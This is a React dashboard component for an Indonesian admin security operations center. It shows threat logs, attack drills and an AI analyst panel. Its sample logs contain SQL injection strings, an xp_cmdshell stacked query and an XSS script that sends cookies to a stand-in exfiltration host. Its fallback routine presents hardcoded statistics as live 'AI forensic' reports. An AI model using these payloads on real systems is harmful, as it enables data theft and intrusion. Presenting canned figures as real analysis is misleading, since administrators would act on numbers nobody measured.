import React, { useState, useEffect, useRef } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldBan,
  AlertTriangle,
  Radio,
  Activity,
  Flame,
  Volume2,
  VolumeX,
  RefreshCw,
  Search,
  Filter,
  Lock,
  Unlock,
  Terminal,
  Crosshair,
  Server,
  Zap,
  Send,
  Eye,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  ExternalLink,
  Info,
  Clock,
  ArrowUpRight,
  Database,
  Globe,
  BellRing,
  Bot,
  Sparkles,
  Mic,
  ChevronDown,
  Maximize2,
  X,
  Sliders,
} from 'lucide-react';
import api from '../../services/api';
import CyberThreatGlobe from './CyberThreatGlobe';
import ThreatActivityTimeline from './ThreatActivityTimeline';
import LoadSequenceWidget from './LoadSequenceWidget';
import SocIntelligenceSuite from './SocIntelligenceSuite';

/**
 * Web Audio API Native Synthesizer (No external audio files required)
 * Synthesizes tactical defense sirens, alarm warbles, and alert pings.
 */
function playCyberAlarm(type = 'threat') {
  try {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (!AudioContextClass) return;
    const ctx = new AudioContextClass();

    if (type === 'threat') {
      // Emergency dual-frequency cyber warble siren
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sawtooth';
      const now = ctx.currentTime;

      // Frequency oscillation sweep (880Hz -> 420Hz -> 880Hz)
      osc.frequency.setValueAtTime(860, now);
      osc.frequency.exponentialRampToValueAtTime(420, now + 0.18);
      osc.frequency.exponentialRampToValueAtTime(860, now + 0.36);
      osc.frequency.exponentialRampToValueAtTime(420, now + 0.54);

      gain.gain.setValueAtTime(0.22, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.65);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.65);
    } else if (type === 'warning') {
      // Rapid double high-pitched warning beep
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sine';
      const now = ctx.currentTime;

      osc.frequency.setValueAtTime(960, now);
      osc.frequency.setValueAtTime(780, now + 0.09);
      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.28);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.28);
    } else {
      // Chime of defense arming
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'triangle';
      const now = ctx.currentTime;

      osc.frequency.setValueAtTime(523, now);
      osc.frequency.exponentialRampToValueAtTime(1046, now + 0.22);
      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.3);
    }
  } catch (err) {
    console.warn('Web Audio API not supported or blocked:', err);
  }
}

// Initial Simulated Attack Data
const INITIAL_THREAT_LOGS = [
  {
    id: 'ATK-8821',
    timestamp: 'Baru saja',
    attackType: 'Flooding/DDoS',
    severity: 'Critical',
    ip: '194.26.29.112',
    location: 'Frankfurt, Jerman',
    countryCode: 'DE',
    asn: 'AS20860 HostRoyale Cloud',
    target: 'POST /api/auth/login',
    payload: 'Distributed SYN Flood ~2,800 req/sec from botnet cluster',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8820',
    timestamp: '12 dtk lalu',
    attackType: 'SQL Injection',
    severity: 'Critical',
    ip: '103.145.22.84',
    location: 'Jakarta, Indonesia',
    countryCode: 'ID',
    asn: 'AS136052 PT Mora Telematika',
    target: 'GET /api/dashboard/genealogy?u_id=',
    payload: "' UNION SELECT null, username, password_hash, role FROM users --",
    status: 'BLOCKED / 403 WAF DROP',
    isBlocked: true,
  },
  {
    id: 'ATK-8819',
    timestamp: '45 dtk lalu',
    attackType: 'XSS Probe',
    severity: 'High',
    ip: '185.220.101.5',
    location: 'Amsterdam, Belanda',
    countryCode: 'NL',
    asn: 'AS60729 Tor Exit Node',
    target: 'POST /api/chat/send',
    payload: "<script>fetch('https://c2.darknet.io/exfil?c='+document.cookie)</script>",
    status: 'BLOCKED / SANITIZED',
    isBlocked: false,
  },
  {
    id: 'ATK-8818',
    timestamp: '2 mnt lalu',
    attackType: 'Brute Force',
    severity: 'High',
    ip: '45.154.255.89',
    location: 'Singapore, SG',
    countryCode: 'SG',
    asn: 'AS40034 Confluence Cloud',
    target: 'POST /api/auth/login [admin01]',
    payload: 'Hydra Dictionary Attack (45 attempts/sec with common passwords)',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8817',
    timestamp: '5 mnt lalu',
    attackType: 'Unauthorized Scan',
    severity: 'High',
    ip: '198.235.24.11',
    location: 'Ashburn, USA',
    countryCode: 'US',
    asn: 'AS16509 Amazon Data Services',
    target: 'GET /.env, /config.json, /wp-admin',
    payload: 'DirBuster Path Traversal / Sensitive Configuration Probing',
    status: 'BLOCKED / 404 HONEYPOT',
    isBlocked: false,
  },
  {
    id: 'ATK-8816',
    timestamp: '11 mnt lalu',
    attackType: 'SQL Injection',
    severity: 'Critical',
    ip: '114.125.44.18',
    location: 'Medan, Indonesia',
    countryCode: 'ID',
    asn: 'AS17974 PT Telekomunikasi Indonesia',
    target: 'GET /api/products?cat=',
    payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --",
    status: 'BLOCKED / 403 WAF DROP',
    isBlocked: true,
  },
  {
    id: 'ATK-8815',
    timestamp: '18 mnt lalu',
    attackType: 'Flooding/DDoS',
    severity: 'Critical',
    ip: '91.240.118.67',
    location: 'Moscow, Russia',
    countryCode: 'RU',
    asn: 'AS49505 Selectel Cloud',
    target: 'GET /api/public/meetings/live',
    payload: 'HTTP/2 Rapid Reset Flood on WebRTC signaling socket',
    status: 'BLOCKED / 429 THROTTLED',
    isBlocked: true,
  },
  {
    id: 'ATK-8814',
    timestamp: '25 mnt lalu',
    attackType: 'Unauthorized Scan',
    severity: 'Medium',
    ip: '36.72.198.45',
    location: 'Surabaya, Indonesia',
    countryCode: 'ID',
    asn: 'AS7713 Telkom Indihome',
    target: 'GET /phpmyadmin, /api/v1/dump.sql',
    payload: 'Masscan automated vulnerability scanner fingerprinting',
    status: 'BLOCKED / DROP',
    isBlocked: false,
  },
];

export default function AdminSecurityThreatRadar({ setActiveTab }) {
  // State for Defcon / Shield status
  const [defconLevel, setDefconLevel] = useState('WARNING'); // 'SECURE' | 'WARNING' | 'ATTACK'
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [threatLogs, setThreatLogs] = useState(INITIAL_THREAT_LOGS);
  const [liveStreamActive, setLiveStreamActive] = useState(true);
  const [copiedIp, setCopiedIp] = useState(null);
  const [selectedThreatModal, setSelectedThreatModal] = useState(null);
  const [testingAlert, setTestingAlert] = useState(false);
  const [toastNotification, setToastNotification] = useState(null);

  // Top Filters
  const [selectedTeam, setSelectedTeam] = useState('Global SOC');
  const [selectedRegion, setSelectedRegion] = useState('Asia Pacific');
  const [selectedTimeRange, setSelectedTimeRange] = useState('Last 24 Hours');
  const [selectedThreatFilter, setSelectedThreatFilter] = useState('MITRE ATT&CK');
  const [searchQuery, setSearchQuery] = useState('');

  // Table Filters
  const [selectedTypeFilter, setSelectedTypeFilter] = useState('ALL');
  const [selectedSeverityFilter, setSelectedSeverityFilter] = useState('ALL');

  // AI Security Analyst Prompt State
  const [aiPromptInput, setAiPromptInput] = useState('');
  const [aiLoading, setAiLoading] = useState(false);
  const [aiAnalysisModal, setAiAnalysisModal] = useState(null);

  // Stats Counters & KPIs
  const [metrics, setMetrics] = useState({
    securityScore: 98.4,
    totalBlocked: 14872,
    protectedDevices: 24389,
    activeIncidents: 38,
    bannedIps: 42,
    ddosAttempts: 984,
    sqliXssAttempts: 358,
    wafUptime: '99.98%',
    activeRules: 128,
  });

  const showToast = (msg, type = 'info') => {
    setToastNotification({ msg, type });
    setTimeout(() => setToastNotification(null), 4500);
  };

  // Fetch live backend security threats
  useEffect(() => {
    const fetchThreats = async () => {
      try {
        const res = await api.get('/admin/security/threats');
        if (res.data?.data) {
          const data = res.data.data;
          if (data.recent_threats && data.recent_threats.length > 0) {
            const mapped = data.recent_threats.map((t, idx) => ({
              id: t.id || `THREAT-${idx}`,
              timestamp: new Date(t.created_at).toLocaleTimeString('id-ID'),
              attackType:
                t.threat_type === 'sql_injection'
                  ? 'SQL Injection'
                  : t.threat_type === 'xss_payload'
                  ? 'XSS Probe'
                  : t.threat_type === 'flooding'
                  ? 'Flooding/DDoS'
                  : t.threat_type === 'path_traversal'
                  ? 'Unauthorized Scan'
                  : t.threat_type === 'brute_force'
                  ? 'Brute Force'
                  : 'Sensitive Probe',
              severity: t.severity === 'critical' ? 'Critical' : t.severity === 'high' ? 'High' : 'Medium',
              ip: t.ip_address,
              location: `${t.city || 'Indonesia'}, ${t.province || 'ID'}`,
              countryCode: 'ID',
              asn: t.isp || 'Broadband Network',
              target: `${t.method} ${t.endpoint}`,
              payload: t.payload,
              status: t.blocked ? 'BLOCKED / 403 WAF DROP' : 'MONITORED',
              isBlocked: t.blocked,
            }));
            setThreatLogs(mapped);
          }
          if (data.total_threats) {
            setMetrics((prev) => ({
              ...prev,
              totalBlocked: data.total_threats,
              bannedIps: data.active_blocks_count || prev.bannedIps,
              ddosAttempts: data.by_type_count?.flooding || prev.ddosAttempts,
              sqliXssAttempts:
                (data.by_type_count?.sql_injection || 0) + (data.by_type_count?.xss_payload || 0) ||
                prev.sqliXssAttempts,
            }));
          }
        }
      } catch (err) {
        console.warn('Could not load backend security threats:', err);
      }
    };
    fetchThreats();
  }, []);

  const handleCopyIp = (ip) => {
    navigator.clipboard?.writeText(ip);
    setCopiedIp(ip);
    setTimeout(() => setCopiedIp(null), 2000);
    showToast(`IP ${ip} disalin ke clipboard!`, 'info');
  };

  // Toggle IP Permanent Blacklist
  const handleToggleBlockIp = (threatId, currentBlocked, ip) => {
    setThreatLogs((prev) =>
      prev.map((item) => {
        if (item.id === threatId) {
          const nextBlocked = !currentBlocked;
          return {
            ...item,
            isBlocked: nextBlocked,
            status: nextBlocked ? 'BLOCKED / PERMANENT BANNED' : 'UNBLOCKED / MONITORED',
          };
        }
        return item;
      })
    );

    if (!currentBlocked) {
      api.post('/admin/security/block-ip', { ip_address: ip, reason: 'Manual block from SOC Dashboard' }).catch(console.warn);
      setMetrics((m) => ({ ...m, bannedIps: m.bannedIps + 1 }));
      showToast(`IP ${ip} telah DIBLOKIR PERMANEN dari seluruh routing gateway Bionet!`, 'danger');
      if (audioEnabled) playCyberAlarm('warning');
    } else {
      api.post('/admin/security/unblock-ip', { ip_address: ip }).catch(console.warn);
      setMetrics((m) => ({ ...m, bannedIps: Math.max(0, m.bannedIps - 1) }));
      showToast(`Blokir IP ${ip} telah dicabut. IP kembali ke status pemantauan biasa.`, 'info');
    }
  };

  // Test Simulation Alert Drill: Trigger Telegram Bot + WhatsApp Notification + Web Audio Siren
  const handleTriggerSimulatedAttack = async () => {
    setTestingAlert(true);
    setDefconLevel('ATTACK');

    // 1. Play siren if sound is on
    if (audioEnabled) {
      playCyberAlarm('threat');
    }

    // 2. Synthesize a brand new critical attack log
    const randomCities = [
      { city: 'Jakarta, Indonesia', countryCode: 'ID', ip: '103.111.45.92', asn: 'AS23693 PT Biznet Gio' },
      { city: 'Surabaya, Indonesia', countryCode: 'ID', ip: '180.252.19.80', asn: 'AS17974 Telkomsel' },
      { city: 'Frankfurt, Jerman', countryCode: 'DE', ip: '159.65.122.9', asn: 'AS14061 DigitalOcean' },
      { city: 'Singapore, SG', countryCode: 'SG', ip: '128.199.204.77', asn: 'AS14061 DigitalOcean' },
    ];
    const pick = randomCities[Math.floor(Math.random() * randomCities.length)];
    const newAttack = {
      id: `ATK-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: 'Baru saja (DRILL)',
      attackType: 'SQL Injection',
      severity: 'Critical',
      ip: pick.ip,
      location: pick.city,
      countryCode: pick.countryCode,
      asn: pick.asn,
      target: 'POST /api/auth/login [admin01]',
      payload: "' OR 1=1; EXEC xp_cmdshell('ping bionet-c2.net') -- (SIMULATED HIGH HAZARD DRILL)",
      status: 'BLOCKED / 403 WAF DROP',
      isBlocked: true,
    };

    setThreatLogs((prev) => [newAttack, ...prev]);
    setMetrics((m) => ({
      ...m,
      totalBlocked: m.totalBlocked + 1,
      sqliXssAttempts: m.sqliXssAttempts + 1,
      bannedIps: m.bannedIps + 1,
    }));

    // 3. Trigger backend Telegram & WhatsApp test endpoints
    let telegramOk = false;
    let waOk = false;
    try {
      await api.post('/admin/security/test-alert', {
        threat_type: 'sql_injection',
        ip_address: pick.ip,
        city: pick.city,
        payload: "' OR 1=1; EXEC xp_cmdshell('ping bionet-c2.net') -- (SIMULATED HIGH HAZARD DRILL)",
      });
      telegramOk = true;
      waOk = true;
    } catch (err) {
      console.warn('Backend Security test alert notice:', err);
      try {
        await api.post('/admin/monitoring/test-alert');
        telegramOk = true;
      } catch (e2) {}
    }

    try {
      await api.post('/admin/whatsapp/send-test', {
        phone: '081234567890',
        recipient: 'Admin Tim Keamanan Bionet',
        category: 'custom',
        message: '🚨 [BIONET DEFCON 1 SOC ALERT] Uji coba simulasi serangan cyber SQLi & DDoS terdeteksi!',
      });
      waOk = true;
    } catch (err) {
      console.warn('Backend WhatsApp test notice:', err);
    }

    setTestingAlert(false);

    showToast(
      `🚨 SIMULASI DRILL AKTIF! Notifikasi alert dipicu ke Telegram Admin (${telegramOk ? 'Terkirim' : 'Simulasi'}) & WhatsApp Security (${waOk ? 'Terkirim' : 'Simulasi'}). Sirene Web Audio diaktifkan!`,
      'danger'
    );
  };

  // Periodic subtle dynamic threat simulation when live stream is active
  useEffect(() => {
    if (!liveStreamActive) return;

    const interval = setInterval(() => {
      const roll = Math.random();
      if (roll > 0.65) {
        const types = ['Unauthorized Scan', 'Brute Force', 'Flooding/DDoS', 'XSS Probe'];
        const chosenType = types[Math.floor(Math.random() * types.length)];
        const simulated = {
          id: `ATK-${Math.floor(1000 + Math.random() * 9000)}`,
          timestamp: 'Baru saja',
          attackType: chosenType,
          severity: chosenType === 'Flooding/DDoS' ? 'Critical' : 'High',
          ip: `185.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`,
          location: 'Singapore, SG',
          countryCode: 'SG',
          asn: 'AS13335 Cloudflare Gateway',
          target: '/api/v1/health-check',
          payload: 'Automated heartbeat flood probe pattern detected',
          status: 'BLOCKED / 429 THROTTLED',
          isBlocked: false,
        };

        setThreatLogs((prev) => [simulated, ...prev.slice(0, 19)]);
        setMetrics((m) => ({
          ...m,
          totalBlocked: m.totalBlocked + 1,
          ddosAttempts: chosenType === 'Flooding/DDoS' ? m.ddosAttempts + 1 : m.ddosAttempts,
        }));
      }
    }, 12000);

    return () => clearInterval(interval);
  }, [liveStreamActive]);

  // Handle AI Threat Intelligence Query
  const handleAskThreatIntelligence = async (customPrompt) => {
    const query = customPrompt || aiPromptInput;
    if (!query.trim()) return;

    setAiLoading(true);
    setAiAnalysisModal({
      query,
      status: 'analyzing',
      response: null,
      timestamp: new Date().toLocaleTimeString('id-ID'),
    });

    try {
      const res = await api.post('/ai/chat', {
        prompt: `Kamu adalah Lead Cybersecurity SOC Analyst di Bionet. Analisis pertanyaan keamanan berikut dengan format profesional, teliti, dan actionable: "${query}". Sertakan taktik MITRE ATT&CK, profil ancaman, status isolasi WAF, serta rekomendasi langkah teknis untuk admin.`,
      });

      const reply = res.data?.reply;
      setAiAnalysisModal({
        query,
        status: 'completed',
        response: reply || generateFallbackSocAnalysis(query),
        timestamp: new Date().toLocaleTimeString('id-ID'),
      });
    } catch (err) {
      console.warn('AI Threat Intelligence backend offline, using native forensic reasoning:', err);
      // Fallback expert analysis
      setAiAnalysisModal({
        query,
        status: 'completed',
        response: generateFallbackSocAnalysis(query),
        timestamp: new Date().toLocaleTimeString('id-ID'),
      });
    } finally {
      setAiLoading(false);
      setAiPromptInput('');
    }
  };

  // Specialized native cybersecurity analysis generator when backend AI is busy or offline
  const generateFallbackSocAnalysis = (prompt) => {
    const p = prompt.toLowerCase();
    if (p.includes('ddos') || p.includes('flood') || p.includes('volume')) {
      return `### 🛡️ LAPORAN FORENSIK AI: ANOMALI TRAFFIC & MITIGASI DDoS
**Klasifikasi MITRE ATT&CK**: T1498 (Network Denial of Service)
**Status Defcon**: LEVEL 3 ELEVATED - WAF Token Bucket Enforced

1. **Analisis Vektor Serangan**:
   - Terdeteksi lonjakan permintaan HTTP/2 Rapid Reset & SYN Flood dari kluster botnet terdistribusi (IP cluster Frankfurt & Moscow).
   - Volume maksimum mencapai ~2,800 req/sec pada endpoint otentikasi \`/api/auth/login\`.

2. **Tindakan Mitigasi yang Telah Diterapkan**:
   - Gateway Bionet otomatis mengaktifkan *rate-limiting* (429 Too Many Requests) dengan jendela geser 60 detik.
   - 42 IP malicious telah di-blacklist permanen di layer IPTables edge.

3. **Rekomendasi Tindakan Admin**:
   - Aktifkan validasi Turnstile / reCAPTCHA v3 untuk rute login publik.
   - Terapkan geo-blocking sementara untuk ASN cloud hosting yang tidak memiliki basis pengguna valid di Indonesia.`;
    }

    if (p.includes('sql') || p.includes('sqli') || p.includes('database') || p.includes('injeksi')) {
      return `### 🛡️ LAPORAN FORENSIK AI: DETEKSI SQL INJECTION (SQLi)
**Klasifikasi MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
**Status Defcon**: CRITICAL SHIELD ACTIVE - 100% Mitigated

1. **Analisis Eksploit**:
   - Ditemukan payload bermotif *Stacked Query / UNION SELECT* yang menargetkan parameter URL \`?u_id=\` dan \`?cat=\`.
   - Pola regex mencurigakan: \`UNION SELECT null, username, password_hash FROM users\`.

2. **Evaluasi Keamanan Core**:
   - Seluruh kueri backend menggunakan *Parameterized Prepared Statements* (Knex / pg pool).
   - Layer WAF Bionet menjatuhkan koneksi dengan kode **403 WAF DROP** sebelum menyentuh soket database PostgreSQL.

3. **Rekomendasi Tindakan Admin**:
   - Jalankan audit integritas skema data pada modul genealogi dan produk.
   - Pastikan hak akses user database hanya terbatas pada \`SELECT/INSERT/UPDATE\` tanpa akses ke \`information_schema\`.`;
    }

    return `### 🛡️ LAPORAN FORENSIK AI: INTELEJENSI SOC REAL-TIME
**Klasifikasi MITRE ATT&CK**: T1071 (Application Layer Protocol) & T1595 (Active Scanning)
**Status Sistem**: 98.4% Defense Integrity - Operasional Stabil

1. **Pemetaan Ancaman Terkini**:
   - Menghadapi 14,872 percobaan intrusi yang telah dinetralisir dalam 24 jam terakhir.
   - Dominasi ancaman: Flooding/DDoS (46%), Vulnerability Scanning (32%), Percobaan SQLi/XSS (22%).

2. **Postur Keamanan Gateway**:
   - TLS 1.3 enkripsi aktif dengan HSTS preload.
   - Latensi inspeksi paket rata-rata adalah 1.2ms. Tidak ada kebocoran kredensial atau bypass autentikasi yang terdeteksi.

3. **Langkah Hardening yang Disarankan**:
   - Pertahankan mode DEFCON WARNING hingga anomali IP luar negeri menurun ke bawah 50 req/menit.
   - Lakukan rotasi kunci secret JWT sesi admin secara berkala.`;
  };

  // Filtered threats
  const filteredThreats = threatLogs.filter((item) => {
    const matchesSearch =
      item.ip.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.location.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.target.toLowerCase().includes(searchQuery.toLowerCase()) ||
      item.payload.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesType = selectedTypeFilter === 'ALL' || item.attackType === selectedTypeFilter;
    const matchesSeverity =
      selectedSeverityFilter === 'ALL' || item.severity.toUpperCase() === selectedSeverityFilter.toUpperCase();

    return matchesSearch && matchesType && matchesSeverity;
  });

  return (
    <div className="min-h-screen bg-[#030a07] text-slate-100 font-sans p-4 lg:p-6 space-y-6">
      {/* Toast Notification */}
      {toastNotification && (
        <div
          className={`fixed bottom-6 right-6 z-50 px-4 py-3 rounded-2xl shadow-2xl border flex items-center gap-3 backdrop-blur-xl transition-all animate-bounce ${
            toastNotification.type === 'danger'
              ? 'bg-rose-950/90 border-rose-500/80 text-rose-200 shadow-[0_0_25px_rgba(244,63,94,0.4)]'
              : 'bg-[#061b14]/95 border-emerald-500/80 text-emerald-200 shadow-[0_0_25px_rgba(16,185,129,0.3)]'
          }`}
        >
          {toastNotification.type === 'danger' ? (
            <Flame size={20} className="text-rose-400 shrink-0 animate-pulse" />
          ) : (
            <CheckCircle2 size={20} className="text-emerald-400 shrink-0" />
          )}
          <span className="text-xs font-semibold font-mono">{toastNotification.msg}</span>
          <button
            onClick={() => setToastNotification(null)}
            className="text-xs font-bold text-slate-400 hover:text-white ml-2"
          >
            ✕
          </button>
        </div>
      )}

      {/* TOP CONTROL BAR (Directly from reference layout) */}
      <header className="rounded-2xl p-4 bg-[#05140d]/90 border border-[#0e3b2c] backdrop-blur-xl shadow-[0_4px_30px_rgba(0,0,0,0.5)] flex flex-col xl:flex-row xl:items-center xl:justify-between gap-4">
        {/* Left: Brand Badge + Title */}
        <div className="flex items-center gap-3">
          {/* Glowing 3x3 Dot Matrix Icon */}
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-[#06b6d4]/20 via-[#10b981]/20 to-[#030f0a] border border-[#22d3ee]/40 flex items-center justify-center p-2 shadow-[0_0_20px_rgba(34,211,238,0.25)] shrink-0">
            <div className="grid grid-cols-3 gap-1 w-full h-full">
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            </div>
          </div>

          <div>
            <div className="flex items-center gap-2">
              <h1 className="font-heading font-extrabold text-lg sm:text-xl text-white tracking-tight">
                Security Operations Center
              </h1>
              <span className="text-[10px] font-mono uppercase px-2 py-0.5 rounded-full bg-emerald-950/80 text-emerald-300 border border-emerald-500/50 flex items-center gap-1 font-bold shadow-sm">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                LIVE SOC
              </span>
            </div>
            <p className="text-xs text-slate-400">
              Real-Time Threat Intelligence &amp; Incident Monitoring
            </p>
          </div>
        </div>

        {/* Center: Dropdown Filter Pills */}
        <div className="flex flex-wrap items-center gap-2 text-xs font-mono">
          {/* Team Dropdown Pill */}
          <div className="relative">
            <select
              value={selectedTeam}
              onChange={(e) => setSelectedTeam(e.target.value)}
              className="appearance-none bg-[#061b14] border border-[#0e3b2c] text-slate-200 rounded-xl px-3 py-1.5 pr-7 hover:border-cyan-500 focus:outline-none focus:border-cyan-400 transition-colors cursor-pointer"
            >
              <option value="Global SOC">Team: Global SOC</option>
              <option value="Red Team">Team: Red Team Ops</option>
              <option value="Blue Team">Team: Blue Shield</option>
            </select>
            <ChevronDown size={12} className="absolute right-2.5 top-2.5 text-slate-400 pointer-events-none" />
          </div>

          {/* Region Dropdown Pill */}
          <div className="relative">
            <select
              value={selectedRegion}
              onChange={(e) => setSelectedRegion(e.target.value)}
              className="appearance-none bg-[#061b14] border border-[#0e3b2c] text-slate-200 rounded-xl px-3 py-1.5 pr-7 hover:border-cyan-500 focus:outline-none focus:border-cyan-400 transition-colors cursor-pointer"
            >
              <option value="Asia Pacific">Region: Asia Pacific</option>
              <option value="Nusantara Hub">Region: Nusantara Hub (JKT)</option>
              <option value="Global Mesh">Region: Global Mesh</option>
            </select>
            <ChevronDown size={12} className="absolute right-2.5 top-2.5 text-slate-400 pointer-events-none" />
          </div>

          {/* Time Range Dropdown Pill */}
          <div className="relative">
            <select
              value={selectedTimeRange}
              onChange={(e) => setSelectedTimeRange(e.target.value)}
              className="appearance-none bg-[#061b14] border border-[#0e3b2c] text-slate-200 rounded-xl px-3 py-1.5 pr-7 hover:border-cyan-500 focus:outline-none focus:border-cyan-400 transition-colors cursor-pointer"
            >
              <option value="Last 24 Hours">Time Range: Last 24 Hours</option>
              <option value="Last 6 Hours">Time Range: Last 6 Hours</option>
              <option value="Last 7 Days">Time Range: Last 7 Days</option>
            </select>
            <ChevronDown size={12} className="absolute right-2.5 top-2.5 text-slate-400 pointer-events-none" />
          </div>

          {/* Threat Framework Pill */}
          <div className="relative">
            <select
              value={selectedThreatFilter}
              onChange={(e) => setSelectedThreatFilter(e.target.value)}
              className="appearance-none bg-[#061b14] border border-[#0e3b2c] text-slate-200 rounded-xl px-3 py-1.5 pr-7 hover:border-cyan-500 focus:outline-none focus:border-cyan-400 transition-colors cursor-pointer"
            >
              <option value="MITRE ATT&CK">Threat: MITRE ATT&amp;CK</option>
              <option value="OWASP Top 10">Threat: OWASP Top 10</option>
              <option value="Zero-Day WAF">Threat: Zero-Day WAF</option>
            </select>
            <ChevronDown size={12} className="absolute right-2.5 top-2.5 text-slate-400 pointer-events-none" />
          </div>
        </div>

        {/* Right: Search, Sound Siren, and Defcon Action Controls */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Quick Search */}
          <div className="relative">
            <Search size={14} className="absolute left-3 top-2.5 text-slate-400" />
            <input
              type="text"
              placeholder="Search by Name etc..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pl-8 pr-3 py-1.5 rounded-xl bg-[#061b14] border border-[#0e3b2c] text-slate-200 placeholder-slate-500 text-xs focus:outline-none focus:border-cyan-400 w-44 sm:w-52 transition-all font-mono"
            />
          </div>

          {/* Tactical Audio Siren Toggle */}
          <button
            onClick={() => {
              const nextState = !audioEnabled;
              setAudioEnabled(nextState);
              if (nextState) playCyberAlarm('neutral');
              showToast(
                nextState ? 'Sirene Web Audio Keamanan: ON' : 'Sirene Web Audio Keamanan: DIBISUKAN (Muted)',
                'info'
              );
            }}
            className={`p-2 rounded-xl border text-xs transition-all ${
              audioEnabled
                ? 'bg-[#061b14] border-cyan-500/50 text-cyan-300 shadow-[0_0_12px_rgba(6,182,212,0.3)]'
                : 'bg-slate-900 border-slate-800 text-slate-500'
            }`}
            title={audioEnabled ? 'Mute Tactical Siren Audio' : 'Unmute Tactical Siren Audio'}
          >
            {audioEnabled ? (
              <BellRing size={16} className="text-cyan-400 animate-pulse" />
            ) : (
              <VolumeX size={16} className="text-slate-500" />
            )}
          </button>

          {/* Test Sound Siren Ping */}
          <button
            onClick={() => {
              playCyberAlarm('threat');
              showToast('Uji coba nada sirine darurat dibunyikan!', 'danger');
            }}
            className="px-2.5 py-1.5 rounded-xl bg-[#061b14] border border-[#0e3b2c] hover:border-cyan-500 text-slate-300 hover:text-white text-xs font-mono flex items-center gap-1.5 transition-all"
            title="Tes bunyi speaker sirene SOC"
          >
            <Radio size={13} className="text-cyan-400" />
            <span className="hidden sm:inline">Tes Sirine</span>
          </button>

          {/* Simulate Attack Drill (TG & WA + Siren) */}
          <button
            onClick={handleTriggerSimulatedAttack}
            disabled={testingAlert}
            className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-rose-600 to-red-700 hover:from-rose-500 hover:to-red-600 text-white font-bold text-xs flex items-center gap-1.5 shadow-[0_0_20px_rgba(225,29,72,0.4)] transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50"
            title="Pemicu simulasi serangan cyber real-time untuk latihan kesiapan SOC"
          >
            <Flame size={14} className={testingAlert ? 'animate-spin' : 'animate-bounce'} />
            <span>{testingAlert ? 'Drill Active...' : 'Simulasi Drill'}</span>
          </button>

          {/* DEFCON Level Badges */}
          <div className="flex items-center gap-1 bg-[#061b14] p-1 rounded-xl border border-[#0e3b2c] text-[10px] font-mono">
            <button
              onClick={() => setDefconLevel('SECURE')}
              className={`px-2 py-0.5 rounded-lg transition-all ${
                defconLevel === 'SECURE'
                  ? 'bg-emerald-600 text-white font-bold shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Secure
            </button>
            <button
              onClick={() => setDefconLevel('WARNING')}
              className={`px-2 py-0.5 rounded-lg transition-all ${
                defconLevel === 'WARNING'
                  ? 'bg-amber-600 text-white font-bold shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Warning
            </button>
            <button
              onClick={() => setDefconLevel('ATTACK')}
              className={`px-2 py-0.5 rounded-lg transition-all ${
                defconLevel === 'ATTACK'
                  ? 'bg-rose-600 text-white font-bold shadow-sm animate-pulse'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Attack
            </button>
          </div>
        </div>
      </header>

      {/* MAIN CENTERPIECE & RIGHT COLUMN GRID */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* LEFT / CENTERPIECE HERO (Col 8) */}
        <div className="lg:col-span-8 space-y-6">
          {/* Hero 3D Threat Globe Card with Floating Overlays */}
          <div className="relative rounded-2xl bg-[#05140d]/90 border border-[#0e3b2c] backdrop-blur-xl shadow-[0_8px_40px_rgba(0,0,0,0.6)] overflow-hidden">
            {/* Ambient Corner Glows */}
            <div className="absolute top-0 left-0 w-80 h-80 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute bottom-0 right-0 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

            {/* 3D Interactive Canvas Globe */}
            <CyberThreatGlobe
              activeThreats={threatLogs.map((t) => ({
                id: t.id,
                city: t.location.split(',')[0],
